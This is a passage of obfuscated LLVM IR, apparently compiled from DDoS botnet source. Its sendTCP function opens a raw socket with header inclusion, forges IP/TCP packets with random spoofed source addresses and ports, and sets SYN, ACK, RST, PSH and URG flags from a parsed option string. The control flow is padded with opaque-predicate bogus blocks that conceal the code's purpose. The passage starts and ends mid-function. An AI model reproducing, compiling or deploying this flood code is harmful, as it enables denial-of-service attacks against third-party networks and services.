  store i32 0, i32* %30, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %216
  %618 = load i32, i32* %30, align 4
  %_35 = sub i32 0, %618
  %gen36 = add i32 %_35, 1
  %_37 = sub i32 %618, 1
  %gen38 = mul i32 %_37, 1
  %_39 = sub i32 %618, 1
  %gen40 = mul i32 %_39, 1
  %_41 = shl i32 %618, 1
  %_42 = shl i32 %618, 1
  %_43 = sub i32 0, %618
  %gen44 = add i32 %_43, 1
  %_45 = shl i32 %618, 1
  %_46 = sub i32 0, %618
  %gen47 = add i32 %_46, 1
  %619 = add i32 %618, 1
  store i32 %619, i32* %30, align 4
  %620 = load i32, i32* %31, align 4
  %621 = load i32, i32* %23, align 4
  %622 = icmp eq i32 %620, %621
  br label %originalBB34

originalBB51alteredBB:                            ; preds = %originalBB51, %245
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %278
  %623 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %624 = call i32 @rand_cmwc()
  %_56 = shl i32 %623, %624
  %_57 = shl i32 %623, %624
  %_58 = sub i32 %623, %624
  %gen59 = mul i32 %_58, %624
  %625 = xor i32 %623, %624
  call void @srand(i32 %625) #2
  %626 = call i32 @rand() #2
  call void @init_rand(i32 %626)
  br label %originalBB55

originalBB63alteredBB:                            ; preds = %originalBB63, %299
  %627 = load i32, i32* %20, align 4
  %628 = icmp eq i32 %627, 0
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %318
  store i32 0, i32* %35, align 4
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %335
  %629 = load i32, i32* %20, align 4
  %_72 = shl i32 32, %629
  %_73 = sub i32 32, %629
  %gen74 = mul i32 %_73, %629
  %_75 = sub i32 0, 32
  %gen76 = add i32 %_75, %629
  %_77 = shl i32 32, %629
  %_78 = sub i32 0, 32
  %gen79 = add i32 %_78, %629
  %_80 = shl i32 32, %629
  %_81 = sub i32 0, 32
  %gen82 = add i32 %_81, %629
  %_83 = sub i32 32, %629
  %gen84 = mul i32 %_83, %629
  %630 = sub nsw i32 32, %629
  %_85 = sub i32 1, %630
  %gen86 = mul i32 %_85, %630
  %_87 = sub i32 0, 1
  %gen88 = add i32 %_87, %630
  %631 = shl i32 1, %630
  %_89 = sub i32 %631, 1
  %gen90 = mul i32 %_89, 1
  %_91 = shl i32 %631, 1
  %_92 = sub i32 0, %631
  %gen93 = add i32 %_92, 1
  %_94 = sub i32 0, %631
  %gen95 = add i32 %_94, 1
  %_96 = sub i32 0, %631
  %gen97 = add i32 %_96, 1
  %_98 = sub i32 0, %631
  %gen99 = add i32 %_98, 1
  %632 = sub nsw i32 %631, 1
  %_100 = sub i32 0, %632
  %gen101 = add i32 %_100, -1
  %633 = xor i32 %632, -1
  store i32 %633, i32* %35, align 4
  br label %originalBB71

originalBB105alteredBB:                           ; preds = %originalBB105, %396
  %634 = call i32 @rand_cmwc()
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %496
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %513
  store i32 0, i32* %40, align 4
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %530
  %635 = load i32, i32* %40, align 4
  %_118 = sub i32 %635, 1
  %gen119 = mul i32 %_118, 1
  %_120 = sub i32 0, %635
  %gen121 = add i32 %_120, 1
  %_122 = sub i32 %635, 1
  %gen123 = mul i32 %_122, 1
  %_124 = sub i32 0, %635
  %gen125 = add i32 %_124, 1
  %_126 = sub i32 %635, 1
  %gen127 = mul i32 %_126, 1
  %_128 = sub i32 %635, 1
  %gen129 = mul i32 %_128, 1
  %_130 = sub i32 0, %635
  %gen131 = add i32 %_130, 1
  %_132 = shl i32 %635, 1
  %636 = add i32 %635, 1
  store i32 %636, i32* %40, align 4
  %637 = load i32, i32* %41, align 4
  %638 = load i32, i32* %23, align 4
  %639 = icmp eq i32 %637, %638
  br label %originalBB117

originalBB136alteredBB:                           ; preds = %originalBB136, %556
  %640 = load i32, i32* %41, align 4
  %_137 = sub i32 %640, 1
  %gen138 = mul i32 %_137, 1
  %641 = add i32 %640, 1
  store i32 %641, i32* %41, align 4
  br label %originalBB136
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %55

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* @x.87
  %36 = load i32, i32* @y.88
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %9, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i32, i32* @x.87
  %48 = load i32, i32* @y.88
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %55

; <label>:55:                                     ; preds = %originalBBpart2, %30
  %56 = load i32, i32* @x.87
  %57 = load i32, i32* @y.88
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i8*, i8** %8, align 8
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %66 = call i32 @getHost(i8* %64, %struct.in_addr* %65)
  %67 = icmp ne i32 %66, 0
  %68 = load i32, i32* @x.87
  %69 = load i32, i32* @y.88
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %67, label %76, label %77

; <label>:76:                                     ; preds = %originalBBpart24
  br label %540

; <label>:77:                                     ; preds = %originalBBpart24
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %79 = getelementptr inbounds [8 x i8], [8 x i8]* %78, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 8, i32 4, i1 false)
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %80, i32* %17, align 4
  %81 = load i32, i32* %17, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %84, label %83

; <label>:83:                                     ; preds = %77
  br label %540

; <label>:84:                                     ; preds = %77
  %85 = load i32, i32* @x.87
  %86 = load i32, i32* @y.88
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  store i32 1, i32* %18, align 4
  %93 = load i32, i32* %17, align 4
  %94 = bitcast i32* %18 to i8*
  %95 = call i32 @setsockopt(i32 %93, i32 0, i32 3, i8* %94, i32 4) #2
  %96 = icmp slt i32 %95, 0
  %97 = load i32, i32* @x.87
  %98 = load i32, i32* @y.88
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %96, label %105, label %106

; <label>:105:                                    ; preds = %originalBBpart28
  br label %540

; <label>:106:                                    ; preds = %originalBBpart28
  %107 = load i32, i32* %11, align 4
  %108 = icmp eq i32 %107, 0
  br i1 %108, label %109, label %126

; <label>:109:                                    ; preds = %106
  %110 = load i32, i32* @x.87
  %111 = load i32, i32* @y.88
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  store i32 0, i32* %19, align 4
  %118 = load i32, i32* @x.87
  %119 = load i32, i32* @y.88
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %132

; <label>:126:                                    ; preds = %106
  %127 = load i32, i32* %11, align 4
  %128 = sub nsw i32 32, %127
  %129 = shl i32 1, %128
  %130 = sub nsw i32 %129, 1
  %131 = xor i32 %130, -1
  store i32 %131, i32* %19, align 4
  br label %132

; <label>:132:                                    ; preds = %126, %originalBBpart212
  %133 = load i32, i32* @x.87
  %134 = load i32, i32* @y.88
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %132
  %141 = load i32, i32* %13, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 40, %142
  %144 = call i8* @llvm.stacksave()
  store i8* %144, i8** %20, align 8
  %145 = alloca i8, i64 %143, align 16
  %146 = bitcast i8* %145 to %struct.iphdr*
  store %struct.iphdr* %146, %struct.iphdr** %21, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = getelementptr i8, i8* %148, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  store %struct.tcphdr* %150, %struct.tcphdr** %22, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = load i32, i32* %19, align 4
  %156 = call i32 @GetRandomIP(i32 %155)
  %157 = call i32 @htonl(i32 %156) #13
  %158 = load i32, i32* %13, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 20, %159
  %161 = trunc i64 %160 to i32
  call void @makeIPPacket(%struct.iphdr* %151, i32 %154, i32 %157, i8 zeroext 6, i32 %161)
  %162 = call i32 @rand_cmwc()
  %163 = trunc i32 %162 to i16
  %164 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon.0* %165 to %struct.anon.1*
  %167 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %166, i32 0, i32 0
  store i16 %163, i16* %167, align 4
  %168 = call i32 @rand_cmwc()
  %169 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  %171 = bitcast %union.anon.0* %170 to %struct.anon.1*
  %172 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %171, i32 0, i32 2
  store i32 %168, i32* %172, align 4
  %173 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %174 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon.0* %174 to %struct.anon.1*
  %176 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %175, i32 0, i32 3
  store i32 0, i32* %176, align 4
  %177 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %178 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %177, i32 0, i32 0
  %179 = bitcast %union.anon.0* %178 to %struct.anon.1*
  %180 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %179, i32 0, i32 4
  %181 = load i16, i16* %180, align 4
  %182 = and i16 %181, -241
  %183 = or i16 %182, 80
  store i16 %183, i16* %180, align 4
  %184 = load i8*, i8** %12, align 8
  %185 = call i32 @strcmp(i8* %184, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.388, i32 0, i32 0)) #10
  %186 = icmp ne i32 %185, 0
  %187 = load i32, i32* @x.87
  %188 = load i32, i32* @y.88
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart249, label %originalBB14alteredBB

originalBBpart249:                                ; preds = %originalBB14
  br i1 %186, label %231, label %195

; <label>:195:                                    ; preds = %originalBBpart249
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.0* %197 to %struct.anon.1*
  %199 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -513
  %202 = or i16 %201, 512
  store i16 %202, i16* %199, align 4
  %203 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon.0* %204 to %struct.anon.1*
  %206 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = and i16 %207, -1025
  %209 = or i16 %208, 1024
  store i16 %209, i16* %206, align 4
  %210 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon.0* %211 to %struct.anon.1*
  %213 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %214, -257
  %216 = or i16 %215, 256
  store i16 %216, i16* %213, align 4
  %217 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon.0* %218 to %struct.anon.1*
  %220 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %219, i32 0, i32 4
  %221 = load i16, i16* %220, align 4
  %222 = and i16 %221, -4097
  %223 = or i16 %222, 4096
  store i16 %223, i16* %220, align 4
  %224 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 0
  %226 = bitcast %union.anon.0* %225 to %struct.anon.1*
  %227 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %228, -2049
  %230 = or i16 %229, 2048
  store i16 %230, i16* %227, align 4
  br label %401

; <label>:231:                                    ; preds = %originalBBpart249
  %232 = load i32, i32* @x.87
  %233 = load i32, i32* @y.88
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %231
  %240 = load i8*, i8** %12, align 8
  %241 = call i8* @strtok(i8* %240, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %241, i8** %23, align 8
  %242 = load i32, i32* @x.87
  %243 = load i32, i32* @y.88
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %250

; <label>:250:                                    ; preds = %382, %originalBBpart253
  %251 = load i8*, i8** %23, align 8
  %252 = icmp ne i8* %251, null
  br i1 %252, label %253, label %384

; <label>:253:                                    ; preds = %250
  %254 = load i8*, i8** %23, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.390, i32 0, i32 0)) #10
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %265, label %257

; <label>:257:                                    ; preds = %253
  %258 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.0* %259 to %struct.anon.1*
  %261 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %262, -513
  %264 = or i16 %263, 512
  store i16 %264, i16* %261, align 4
  br label %382

; <label>:265:                                    ; preds = %253
  %266 = load i8*, i8** %23, align 8
  %267 = call i32 @strcmp(i8* %266, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.391, i32 0, i32 0)) #10
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %293, label %269

; <label>:269:                                    ; preds = %265
  %270 = load i32, i32* @x.87
  %271 = load i32, i32* @y.88
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %269
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = and i16 %282, -1025
  %284 = or i16 %283, 1024
  store i16 %284, i16* %281, align 4
  %285 = load i32, i32* @x.87
  %286 = load i32, i32* @y.88
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart273, label %originalBB55alteredBB

originalBBpart273:                                ; preds = %originalBB55
  br label %381

; <label>:293:                                    ; preds = %265
  %294 = load i32, i32* @x.87
  %295 = load i32, i32* @y.88
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %293
  %302 = load i8*, i8** %23, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.392, i32 0, i32 0)) #10
  %304 = icmp ne i32 %303, 0
  %305 = load i32, i32* @x.87
  %306 = load i32, i32* @y.88
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %304, label %321, label %313

; <label>:313:                                    ; preds = %originalBBpart277
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = and i16 %318, -257
  %320 = or i16 %319, 256
  store i16 %320, i16* %317, align 4
  br label %380

; <label>:321:                                    ; preds = %originalBBpart277
  %322 = load i8*, i8** %23, align 8
  %323 = call i32 @strcmp(i8* %322, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.393, i32 0, i32 0)) #10
  %324 = icmp ne i32 %323, 0
  br i1 %324, label %349, label %325

; <label>:325:                                    ; preds = %321
  %326 = load i32, i32* @x.87
  %327 = load i32, i32* @y.88
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %325
  %334 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %335 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %334, i32 0, i32 0
  %336 = bitcast %union.anon.0* %335 to %struct.anon.1*
  %337 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %336, i32 0, i32 4
  %338 = load i16, i16* %337, align 4
  %339 = and i16 %338, -4097
  %340 = or i16 %339, 4096
  store i16 %340, i16* %337, align 4
  %341 = load i32, i32* @x.87
  %342 = load i32, i32* @y.88
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBBpart298, label %originalBB79alteredBB

originalBBpart298:                                ; preds = %originalBB79
  br label %379

; <label>:349:                                    ; preds = %321
  %350 = load i8*, i8** %23, align 8
  %351 = call i32 @strcmp(i8* %350, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.394, i32 0, i32 0)) #10
  %352 = icmp ne i32 %351, 0
  br i1 %352, label %361, label %353

; <label>:353:                                    ; preds = %349
  %354 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %355 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %354, i32 0, i32 0
  %356 = bitcast %union.anon.0* %355 to %struct.anon.1*
  %357 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %356, i32 0, i32 4
  %358 = load i16, i16* %357, align 4
  %359 = and i16 %358, -2049
  %360 = or i16 %359, 2048
  store i16 %360, i16* %357, align 4
  br label %378

; <label>:361:                                    ; preds = %349
  %362 = load i32, i32* @x.87
  %363 = load i32, i32* @y.88
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %361
  %370 = load i32, i32* @x.87
  %371 = load i32, i32* @y.88
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %378

; <label>:378:                                    ; preds = %originalBBpart2102, %353
  br label %379

; <label>:379:                                    ; preds = %378, %originalBBpart298
  br label %380

; <label>:380:                                    ; preds = %379, %313
  br label %381

; <label>:381:                                    ; preds = %380, %originalBBpart273
  br label %382

; <label>:382:                                    ; preds = %381, %257
  %383 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %383, i8** %23, align 8
  br label %250

; <label>:384:                                    ; preds = %250
  %385 = load i32, i32* @x.87
  %386 = load i32, i32* @y.88
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %384
  %393 = load i32, i32* @x.87
  %394 = load i32, i32* @y.88
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %401

; <label>:401:                                    ; preds = %originalBBpart2106, %195
  %402 = call i32 @rand_cmwc()
  %403 = trunc i32 %402 to i16
  %404 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 0
  %406 = bitcast %union.anon.0* %405 to %struct.anon.1*
  %407 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %406, i32 0, i32 5
  store i16 %403, i16* %407, align 2
  %408 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %409 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %408, i32 0, i32 0
  %410 = bitcast %union.anon.0* %409 to %struct.anon.1*
  %411 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %410, i32 0, i32 6
  store i16 0, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon.0* %413 to %struct.anon.1*
  %415 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %414, i32 0, i32 7
  store i16 0, i16* %415, align 2
  %416 = load i32, i32* %9, align 4
  %417 = icmp eq i32 %416, 0
  br i1 %417, label %418, label %420

; <label>:418:                                    ; preds = %401
  %419 = call i32 @rand_cmwc()
  br label %425

; <label>:420:                                    ; preds = %401
  %421 = load i32, i32* %9, align 4
  %422 = trunc i32 %421 to i16
  %423 = call zeroext i16 @htons(i16 zeroext %422) #13
  %424 = zext i16 %423 to i32
  br label %425

; <label>:425:                                    ; preds = %420, %418
  %426 = phi i32 [ %419, %418 ], [ %424, %420 ]
  %427 = trunc i32 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 0
  %430 = bitcast %union.anon.0* %429 to %struct.anon.1*
  %431 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %430, i32 0, i32 1
  store i16 %427, i16* %431, align 2
  %432 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %433 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %434 = call zeroext i16 @tcpcsum(%struct.iphdr* %432, %struct.tcphdr* %433)
  %435 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = bitcast %union.anon.0* %436 to %struct.anon.1*
  %438 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %437, i32 0, i32 6
  store i16 %434, i16* %438, align 4
  %439 = bitcast i8* %145 to i16*
  %440 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 2
  %442 = load i16, i16* %441, align 2
  %443 = zext i16 %442 to i32
